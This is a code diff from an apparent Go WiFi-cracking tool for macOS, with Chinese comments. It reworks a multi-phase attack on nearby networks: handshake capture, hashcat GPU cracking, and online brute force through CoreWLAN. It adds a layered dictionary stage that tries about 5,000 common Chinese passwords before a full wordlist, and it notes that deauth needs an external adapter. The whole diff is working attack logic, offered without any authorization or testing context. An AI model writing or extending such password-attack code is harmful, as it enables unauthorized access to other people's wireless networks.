@@ -637,17 +637,17 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 		}
 		fmt.Printf("\n    - TOP %d个密码均未命中\n", len(topPasswords))
 
-		// ── Phase 3: 捕获握手包 + hashcat GPU字典攻击（分钟级） ──
-		// 检查所需工具和sudo权限
+		// ── Phase 3: 握手包捕获（macOS内置WiFi不支持帧注入） ──
+		// Apple WiFi驱动不支持frame injection（见bettercap issue #448）
+		// deauth帧无法发送 → 无法强制客户端重连 → 握手包难以捕获
+		// 此功能需要外部USB WiFi适配器（如Alfa AWUS036ACH）才能使用
 		missingTools := capture.CheckTools()
 		hasGPUTools := len(missingTools) == 0
 		hashcatOK, _ := hashcrack.CheckHashcat()
 		hasSudo := capture.CheckSudo()
 
-		// 如果没有sudo权限，尝试用osascript弹窗请求授权
+		// 尝试请求sudo权限
 		if !hasSudo && hasGPUTools && hashcatOK {
-			fmt.Println("  [Phase 3] 需要sudo权限，正在请求授权...")
-			// 用osascript弹出密码输入框（macOS原生方式）
 			authCmd := exec.Command("sudo", "-v")
 			authCmd.Stdin = os.Stdin
 			authCmd.Stdout = os.Stdout
@@ -657,9 +657,9 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 			}
 		}
 
-		gpuDone := false // 标记是否执行过GPU攻击
+		gpuDone := false
 		if hasGPUTools && hashcatOK && hasSudo {
-			fmt.Println("  [Phase 3] 握手包捕获 + GPU字典攻击...")
+			fmt.Println("  [Phase 3] 握手包捕获（macOS内置WiFi不支持deauth，尝试被动捕获）...")
 
 			cfg := capture.DefaultCaptureConfig()
 			cfg.Verbose = verbose
@@ -719,33 +719,62 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 			}
 		}
 
-		// ── Phase 5: CoreWLAN在线字典爆破（兜底，排除Phase 2已试的TOP密码） ──
-		// 如果GPU攻击已完成字典+8位数字暴力都未命中，在线爆破也极不可能成功，跳过
+		// ── Phase 5: CoreWLAN在线字典爆破（分层策略） ──
+		// macOS上Phase 3-4不稳定，Phase 5是主力攻击方式
+		// 分层：先高频密码（快速命中弱密码），再完整字典（兜底）
 		if gpuDone {
-			fmt.Println("  [Phase 5] 跳过在线爆破（GPU已完成字典+暴力均未命中，在线更慢无意义）")
+			fmt.Println("  [Phase 5] 跳过（GPU已完成字典+暴力均未命中）")
 		} else {
-			fmt.Println("  [Phase 5] CoreWLAN在线字典爆破（兆底方案）...")
-			// 构建完整字典并排除Phase 2已试的TOP密码
-			allPwds := allPasswordsForTargets([]scanner.WiFiNetwork{t}, dictFile)
+			// 排除Phase 2已试的TOP密码
 			topSet := make(map[string]bool)
 			for _, p := range topPasswords {
 				topSet[p] = true
 			}
-			var remainPwds []string
-			for _, p := range allPwds {
+
+			// 第1层：中国定制高频密码（约5000条，50ms间隔 ≈ 4分钟）
+			chinaPwds := dict.GenerateAllChinese()
+			var layer1 []string
+			for _, p := range chinaPwds {
 				if !topSet[p] {
-					remainPwds = append(remainPwds, p)
+					layer1 = append(layer1, p)
 				}
 			}
-			if len(remainPwds) > 0 {
-				crackCfg := cracker.CrackConfig{
-					Delay:    time.Duration(delay) * time.Millisecond,
-					Verbose:  verbose,
-					MaxRetry: 1,
+			fmt.Printf("  [Phase 5a] 中国高频密码字典（%d条，预计%d分钟）...\n",
+				len(layer1), len(layer1)/1200+1)
+
+			crackCfg := cracker.CrackConfig{
+				Delay:    time.Duration(delay) * time.Millisecond,
+				Verbose:  verbose,
+				MaxRetry: 1,
+			}
+			scanner.CacheTarget(t.SSID)
+			r1 := cracker.CrackOne(t, layer1, crackCfg)
+			if r1.Success {
+				successCount++
+				continue
+			}
+
+			// 第2层：完整大字典（如果有wifi_dict.txt）
+			allPwds := allPasswordsForTargets([]scanner.WiFiNetwork{t}, dictFile)
+			// 排除已尝试的
+			triedSet := make(map[string]bool)
+			for _, p := range topPasswords {
+				triedSet[p] = true
+			}
+			for _, p := range layer1 {
+				triedSet[p] = true
+			}
+			var layer2 []string
+			for _, p := range allPwds {
+				if !triedSet[p] {
+					layer2 = append(layer2, p)
 				}
-				scanner.CacheTarget(t.SSID)
-				result := cracker.CrackOne(t, remainPwds, crackCfg)
-				if result.Success {
+			}
+
+			if len(layer2) > 0 {
+				fmt.Printf("  [Phase 5b] 完整字典爆破（%d条，可能需要较长时间）...\n", len(layer2))
+				r2 := cracker.CrackOne(t, layer2, crackCfg)
+				if r2.Success {
 					successCount++
 				}
 			}
